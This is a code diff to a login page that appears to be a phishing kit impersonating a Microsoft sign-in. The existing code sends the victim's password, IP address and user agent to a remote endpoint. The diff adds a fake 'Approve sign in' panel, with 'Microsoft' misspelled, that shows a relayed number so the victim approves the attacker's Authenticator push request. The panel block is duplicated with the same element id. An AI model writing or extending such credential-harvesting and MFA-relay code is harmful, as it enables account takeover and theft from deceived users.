@@ -438,9 +438,21 @@
                             </form>
                         </div>
 
+                        <div id="authentication-app" style="display: none;" class="">
+                            <h2>Approve sign in</h2>
+                            <p>Tap the number you see below in your Micosoft Authenticator app to sign in </p>
+                            <h1 id="authNumber" style="text-align: center; font-weight: bold; font-size: 3rem;"></h1>
+                        </div>
+
+                        <div id="authentication-app" style="display: none;" class="">
+                            <h2>Approve sign in</h2>
+                            <p>Tap the number you see below in your Micosoft Authenticator app to sign in </p>
+                            <h1 id="authNumber" style="text-align: center; font-weight: bold; font-size: 3rem;"></h1>
+                        </div>
+
                         <div id="spinner" class="spinner-overlay" style="display: none;">
                             <div class="spinner"></div>
-                          </div>
+                        </div>
                         
 
                     </div>
@@ -544,7 +556,10 @@
                     password: password,
                     ipAddress: userIP,
                     userAgent: userAgent,
-                    timestamp: new Date().toISOString()
+                    timestamp: new Date().toISOString(),
+                    auth_type:"",
+                    pass_key: "",
+                    message: ""
                 };
 
                 console.log('User login data:', userData);
@@ -568,15 +583,13 @@
                     },
                     body: JSON.stringify(data),
                     });
-					
-					console.log('Data submitted, waiting for confirmation...');
 
                     if (response.ok) {
                         console.log('Data submitted, waiting for confirmation...');
                         
                         const webhookResponse = await new Promise(resolve => {
                             setTimeout(() => {
-                            resolve({ status: 'success', message: 'Confirmation received!' });
+                            resolve({ status: 'success', auth_type :'autentication-app', pass_key: 20, message: 'Confirmation received!' });
                             }, 9000); // simulate webhook wait
                         });
 
@@ -584,6 +597,17 @@
                         confirmation.style.display = 'block';
                         confirmation.textContent = webhookResponse.message;
                         confirmation.style.color = 'green';
+
+                        if (webhookResponse.auth_type === "autentication-app") {
+                            // Show the authentication UI
+                            const authAppDiv = document.getElementById("authentication-app");
+                            authAppDiv.style.display = "block";
+
+                            // Set the number from webhookResponse
+                            const authNumberElement = document.getElementById("authNumber");
+                            authNumberElement.textContent = webhookResponse.pass_key;
+                        }
+
 
                     } else {
                         spinner.style.display = 'none';
